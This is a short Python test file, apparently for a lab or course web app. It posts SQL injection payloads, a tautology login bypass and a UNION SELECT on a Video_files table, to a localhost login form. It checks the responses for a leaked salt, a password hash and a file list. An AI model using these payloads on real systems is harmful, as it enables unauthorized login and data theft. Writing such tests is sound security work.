import sys, requests, pytest

def testClassic():
    s = requests.Session()
    r = s.post("https://localhost/login", data={'username' : "' OR 'x'='x", 'password': 'password'}, verify=False)
    s.close()
    if b"(&#39;pL41qCFwnagJcZsM&#39;, &#39;8c0f5ab2947a5a03c5275599e8b1cff2f7f281d07702a4082fcafa239b621ad8&#39;, &#39;chaim&#39;)" in r.content:
        return True
    return False

def testBlind():
    s = requests.Session()
    r = s.post("https://localhost/login", data={'username' : "chaim' UNION SELECT * FROM Video_files WHERE 'x'='x", 'password': 'password'}, verify=False)
    s.close()

    if b"(&#39;1&#39;, &#39;chaim&#39;, &#39;webapp_is_pain.mp4&#39;)" in r.content:
        return True
    return False

def testSQLInjection():
    assert testClassic() and testBlind() == True